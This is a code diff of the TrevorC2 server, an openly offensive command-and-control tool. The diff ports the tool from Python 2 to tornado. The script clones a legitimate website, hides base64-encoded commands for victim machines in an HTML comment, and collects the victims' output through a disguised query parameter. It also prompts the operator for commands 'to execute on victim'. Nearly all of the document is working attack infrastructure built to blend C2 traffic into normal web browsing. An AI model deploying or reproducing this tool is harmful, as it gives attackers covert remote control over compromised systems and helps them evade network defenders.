@@ -1,182 +1,220 @@
 #!/usr/bin/env python
-#
-# TrevorC2 - legitimate looking command and control 
-# Written by: Dave Kennedy @HackingDave
-# Website: https://www.trustedsec.com
-# GIT: https://github.com/trustedsec
-#
-# This is the server side which will clone a website of your choosing. Once
-# the site is cloned, it'll place information inside the source of the html 
-# to be decoded by the client and executed and then passed back to the server
-# via a query string parameter. 
+"""
+TrevorC2 - legitimate looking command and control.
 
-# URL to clone to house a legitimate website
-url = ("https://www.google.com")
+Written by: Dave Kennedy @HackingDave
+Website: https://www.trustedsec.com
+GIT: https://github.com/trustedsec
 
-# CONFIG OPTIONS
-user_agent = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
+This is the server side which will clone a website of your choosing. Once
+the site is cloned, it'll place information inside the source of the html
+to be decoded by the client and executed and then passed back to the server
+via a query string parameter.
+"""
+import os
+import re
+import ssl
+import sys
+import time
+import glob
+import base64
+import bleach
+import shutil
+import logging
+import urllib3
+import requests
+import threading
+import tornado.web
+import tornado.ioloop
+import tornado.httpserver
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+logging.getLogger("tornado.general").setLevel(logging.CRITICAL)
+logging.getLogger('urllib3').setLevel(logging.WARNING)
+logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+log = logging.getLogger(__name__)
+
+__author__ = 'Dave Kennedy (@HackingDave)'
+__version__ = 0.2
+
+# CONFIG CONSTANTS:
+URL = ("https://www.google.com/")  # URL to clone to house a legitimate website
+USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
 
 # THIS IS WHAT PATH WE WANT TO HIT FOR CODE
-root_path_query = ("/")
+ROOT_PATH_QUERY = ("/")
 
 # THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
-site_path_query = ("/images")
+SITE_PATH_QUERY = ("/images")
 
 # THIS IS THE QUERY STRING PARAMETER USED
-query_string = ("guid=")
+QUERY_STRING = ("guid=")
 
 # STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
-stub = ("oldcss=")
+STUB = ("oldcss=")
 
-import subprocess
-import os
-import sys
-import BaseHTTPServer,SimpleHTTPServer,cgi
-from SocketServer import BaseServer
-from BaseHTTPServer import HTTPServer
-from SimpleHTTPServer import SimpleHTTPRequestHandler
-import urlparse
-import base64
-import thread
-import time
-import re
+SSL = False
+CERT_FILE = ""  # Your Certificate for SSL
 
-# url decode for postbacks
+
+# DO NOT CHANGE BELOW THIS LINE
+
+
 def htc(m):
-    return chr(int(m.group(1),16))
+    """Decode URL for Postbacks."""
+    return chr(int(m.group(1), 16))
 
-# url decode
+
 def urldecode(url):
-    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
-    return rex.sub(htc,url)
+    """URL Decode."""
+    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
+    return rex.sub(htc, url)
 
-# our clone site function to get the site we want
+
 def clone_site(user_agent, url):
-    # remove old site
-    if os.path.isdir("clone_site/"): subprocess.Popen("rm -rf clone_site/", shell=True).wait()
-    os.makedirs("clone_site/")
+    """Our clone site function, to get the site we want to serve.
+
+    :params user_agent = User Agent to grab the site with.
+    :params url = URL if the site you want to clone.
+    """
+    # auto remove old site
+    if os.path.isdir("clone_site/"):
+        for filename in glob.glob(os.path.abspath("clone_site/*")):
+            if os.path.isdir(filename):
+                shutil.rmtree(filename)
+            else:
+                os.remove(filename)
+    else:
+        os.makedirs("clone_site/")
 
     # run our wget
     print("[*] Cloning website: " + url)
-    subprocess.Popen('cd clone_site/;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (user_agent, url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    web_request = requests.get(url, headers={'User-Agent': user_agent}, verify=0)
+    if web_request.status_code != 200 or len(web_request.content) < 1:
+        print("[!] Unable to clone the site. Status Code: %s" % web_request.status_code)
+        print("[!] Exiting TrevorC2...")
+        sys.exit()
+    with open("clone_site/index.html", 'wb') as fh:
+        fh.write(web_request.content)
 
     # report success
-    if os.path.isfile("clone_site/index.html"): 
+    if os.path.isfile("clone_site/index.html"):
         print("[*] Site cloned successfully.")
 
-    # report failure
-    check_index = file("clone_site/index.html", "r").read()
-    # if the site is blank then cleanup and didn't clone right
-    if len(check_index) < 1:
-        print("[!] Unable to clone the site. Check internet connection, or do a different site.")
-        print("[!] Exiting TrevorC2...")
-        if os.path.isdir("clone_site/"): subprocess.Popen("rm -rf clone_site/", shell=True).wait()
-        sys.exit()
 
-# Handler for handling GET requests
-class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-    # hide all of the HTTP requests so we don't get spammed
-    def log_message(self, format, *args):
+class UnknownPageHandler(tornado.web.RequestHandler):
+    """No Endpoint Handler."""
+
+    def get(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Request to Invalid Page from {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
         return
 
-    # handle basic GET requests
-    def do_GET(self):
-        try:
-            # import proper style css files here
-            parsed_path = urlparse.urlparse(self.path)
-            path = parsed_path.path
-            query = parsed_path.query
 
-            if path == root_path_query:
-                self.send_response(200)
-                self.send_header('Content_type', 'text/html')
-                self.end_headers()
-                site_data = file("clone_site/index.html", "r").read()
-                instructions = file("clone_site/instructions.txt", "r").read()
-                site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (stub,instructions))
-                self.wfile.write(site_data)
+class RPQ(tornado.web.RequestHandler):
+    """Output IP address and close."""
 
-            # this will handle if a user wants to receive emails
-            if path == site_path_query:
-                query = query.replace(query_string, "")
-                # urldecode and remove html encoded stuff
-                query=urldecode(query)
-                query = query.replace("+", " ")
-                self.send_response(200)
-                self.send_header('Content_type', 'text/html')
-                self.end_headers()
-                query = base64.b64decode(query)
-                # print our decoded command
-                filewrite = file("clone_site/received.txt", "w")
-                filewrite.write(query)
-                filewrite.close()
+    def get(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Request to C2 Request Handler from {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        site_data = open("clone_site/index.html", "r").read()
+        instructions = str(open("clone_site/instructions.txt", "r").read())
+        site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
+        self.write(str(site_data))
 
-                # reset so client doesn't execute command again
-                filewrite = file("clone_site/instructions.txt", "w")
-                no_instructions = base64.b64encode("nothing")
-                filewrite.write(no_instructions)
-                filewrite.close()
 
-        # if we had something go wrong
-        except Exception, error: print ("[!] Something went wrong, printing error: " + str(error))
+class SPQ(tornado.web.RequestHandler):
+    """Output IP address and close."""
 
-# this ultimately handles the http requests and stuff
-def main(server_class=BaseHTTPServer.HTTPServer,handler_class=HTTPHandler):
-    try:
-        server_address = ('', int(80))
-        httpd = server_class(server_address, handler_class)
-        httpd.serve_forever()
+    def get(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Request to C2 Response Handler from {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        args = self.request.arguments
+        if not args:
+            self.write('CACHE: FILE NOT FOUND\r\n')
+            return
+        for param in args:
+            if param in (QUERY_STRING):
+                query = args[param][0]
+        if not query:
+            return
+        query_output = base64.b64decode(query).decode()  # print our decoded command
+        with open("clone_site/received.txt", "w") as fh:
+            fh.write('=-=-=-=-=-=-=-=-=-=-=\n(CLIENT: {})\n{}'.format(remote_ip, str(query_output)))
 
-    # handle keyboardinterrupts
-    except KeyboardInterrupt:
-        print "[!] Exiting the web server...\n"
-        sys.exit()
+        with open("clone_site/instructions.txt", "w") as fh:
+            no_instructions = base64.b64encode("nothing".encode())
+            fh.write(no_instructions.decode())
 
-    # handle the rest
-    except Exception, error:
-        print "[!] Something went wrong, printing error: " + str(error)
-        pass
+
+def main_c2():
+    """Start C2 Server."""
+    application = tornado.web.Application([
+        (ROOT_PATH_QUERY, RPQ),
+        (SITE_PATH_QUERY, SPQ),
+        (r'/.*', UnknownPageHandler)  # Make this the last line, if not matched, will hit this rule.
+    ])
+    if SSL:
+        http_server = tornado.httpserver.HTTPServer(
+            application, ssl_options={'certfile': CERT_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1})
+        http_server.listen(443)
+        tornado.ioloop.IOLoop.instance().start()
+    else:
+        http_server = tornado.httpserver.HTTPServer(application)
+        http_server.listen(80)
+        tornado.ioloop.IOLoop.instance().start()
+
 
 if __name__ == "__main__":
 
     print(r"""
 
-           ,  .'''''.  ...    ''''',  .'           
-            ','     ,.MMMM;.;'      '.             
-             ;;    ;MMMMMMMMM;     ;;'             
-            :'M:  ;MMMMMMMMMMM;.  :M':             
-            : M:  MMMMMMMMMMMMM:  :M  .           
-           .' M:  MMMMMMMMMMMMM:  :M. ;           
-           ; :M'  :MMMMMMMMMMMM'  'M: :           
-           : :M: .;"MMMMMMMMM":;. ,M: :           
-           :  ::,MMM;.M":::M.;MMM ::' :           
-         ,.;    ;MMMMMM;:MMMMMMMM:    :,.         
-         MMM.;.,MMMMMMMM;MMMMMMMM;.,;.MMM         
-         M':''':MMMMMMMMM;MMMMMMMM: "': M         
-         M.:   ;MMMMMMMMMMMMMMMMMM;   : M         
-         :::   MMMMMMMMMMM;MMMMMMMM   ::M         
-        ,'';   MMMMMMMMMMMM:MMMMMMM   :'".         
-      ,'   :   MMMMMMMMMMMM:MMMMMMM   :   '.       
-     '     :  'MMMMMMMMMMMMM:MMMMMM   ;     '     
-     ,.....;.. MMMMMMMMMMMMM:MMMMMM ..:....;.     
-     :MMMMMMMM MMMMMMMMMMMMM:MMMMMM MMMMMMMM:     
-     :MM''':"" MMMMMMMMMMMMM:MMMMMM "": "'MM:     
-      MM:   :  MMMMMMMMMMMMM:MMMMMM  ,'  :MM       
-      'MM   :  :MMMMMMMMMMMM:MMMMM:  :   ;M:       
-       :M;  :  'MMMMMMMMMMMMMMMMMM'  :  ;MM       
-       :MM. :   :MMMMMMMMMM;MMMMM:   :  MM:       
-        :M: :    MMMMMMMMM'MMMMMM'   : :MM'       
-        'MM :    "MMMMMMM:;MMMMM"   ,' ;M"         
-         'M  :    ""''':;;;'''""    :  M:         
-         ;'  :     "MMMMMMMM;."     :  "".         
-       ,;    :      :MMMMMMM:;.     :    '.       
-      :'     :    ,MM'''""''':M:    :     ';       
-     ;'      :    ;M'         MM.   :       ;.     
-   ,'        :    "            "'   :        '.   
-   '        :'                       '        ''   
- .          :                        '          ' 
-'          ;                          ;          ' 
-          ;                            ' 
+           ,  .'''''.  ...    ''''',  .'
+            ','     ,.MMMM;.;'      '.
+             ;;    ;MMMMMMMMM;     ;;'
+            :'M:  ;MMMMMMMMMMM;.  :M':
+            : M:  MMMMMMMMMMMMM:  :M  .
+           .' M:  MMMMMMMMMMMMM:  :M. ;
+           ; :M'  :MMMMMMMMMMMM'  'M: :
+           : :M: .;"MMMMMMMMM":;. ,M: :
+           :  ::,MMM;.M":::M.;MMM ::' :
+         ,.;    ;MMMMMM;:MMMMMMMM:    :,.
+         MMM.;.,MMMMMMMM;MMMMMMMM;.,;.MMM
+         M':''':MMMMMMMMM;MMMMMMMM: "': M
+         M.:   ;MMMMMMMMMMMMMMMMMM;   : M
+         :::   MMMMMMMMMMM;MMMMMMMM   ::M
+        ,'';   MMMMMMMMMMMM:MMMMMMM   :'".
+      ,'   :   MMMMMMMMMMMM:MMMMMMM   :   '.
+     '     :  'MMMMMMMMMMMMM:MMMMMM   ;     '
+     ,.....;.. MMMMMMMMMMMMM:MMMMMM ..:....;.
+     :MMMMMMMM MMMMMMMMMMMMM:MMMMMM MMMMMMMM:
+     :MM''':"" MMMMMMMMMMMMM:MMMMMM "": "'MM:
+      MM:   :  MMMMMMMMMMMMM:MMMMMM  ,'  :MM
+      'MM   :  :MMMMMMMMMMMM:MMMMM:  :   ;M:
+       :M;  :  'MMMMMMMMMMMMMMMMMM'  :  ;MM
+       :MM. :   :MMMMMMMMMM;MMMMM:   :  MM:
+        :M: :    MMMMMMMMM'MMMMMM'   : :MM'
+        'MM :    "MMMMMMM:;MMMMM"   ,' ;M"
+         'M  :    ""''':;;;'''""    :  M:
+         ;'  :     "MMMMMMMM;."     :  "".
+       ,;    :      :MMMMMMM:;.     :    '.
+      :'     :    ,MM'''""''':M:    :     ';
+     ;'      :    ;M'         MM.   :       ;.
+   ,'        :    "            "'   :        '.
+   '        :'                       '        ''
+ .          :                        '          '
+'          ;                          ;          '
+          ;                            '
 
 
                    #TrevorForget
@@ -185,43 +223,44 @@ if __name__ == "__main__":
     print("TrevorC2 - Legitimate Website Covert Channel")
     print("Written by: David Kennedy (@HackingDave)")
     print("https://www.trustedsec.com")
-    clone_site(user_agent, url)
-    print("[*] Kicking off web server in thread...")
-    thread.start_new_thread(main, ())
-    print("[*] Web server started...")
+    clone_site(USER_AGENT, URL)
+    PYTHONVER = sys.version_info[0]
+    print('[*] Starting C2 Server...')
+    threading.Thread(target=main_c2).start()
 
     # here we say no instructions to the client
-    filewrite = file("clone_site/instructions.txt", "w")
-    no_instructions = base64.b64encode("nothing")
-    filewrite.write(no_instructions)
-    filewrite.close()
+    with open("clone_site/instructions.txt", "w") as fh:
+        no_instructions = base64.b64encode("nothing".encode())
+        fh.write(no_instructions.decode())
 
-    print("[*] Next, enter the command you want the victim to execute.") 
+    print("[*] Next, enter the command you want the victim to execute.")
     print("[*] Client uses random intervals, this may take a few.")
     try:
         while 1:
-            task = raw_input("Enter the command to execute on victim: ")
-            task = base64.b64encode(task)
-            filewrite = file("clone_site/instructions.txt", "w")
-            filewrite.write(task)
-            filewrite.close()
+            if PYTHONVER == 2:
+                task = raw_input("Enter the command to execute on victim: ")
+            elif PYTHONVER == 3:
+                task = input("Enter the command to execute on the victim: ")
+            else:
+                sys.exit("Not sure I support this version of Python.")
+            task_out = base64.b64encode(task.encode())  # Encode to bytes (python3 support)
+            with open("clone_site/instructions.txt", "w") as fh:
+                fh.write(task_out.decode())
             print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
             while 1:
-
                 # we received a hit with our command
                 if os.path.isfile("clone_site/received.txt"):
-                    data = file("clone_site/received.txt").read()
+                    data = open("clone_site/received.txt", "r").read()
                     print("[*] Received response back from client...")
-                    time.sleep(1)
                     print(data)
-
                     # remove this so we don't use it anymore
                     os.remove("clone_site/received.txt")
                     break
-                time.sleep(1)
+                time.sleep(.3)
 
-    # cleanup when using keyboardinterrupt
+        # cleanup when using keyboardinterrupt
     except KeyboardInterrupt:
-        if os.path.isdir("clone_site/"): subprocess.Popen("rm -rf clone_site/", shell=True)
-        print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP.")
+        if os.path.isdir("clone_site/"):
+            shutil.rmtree("clone_site/")
+        print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP(s).")
         sys.exit()
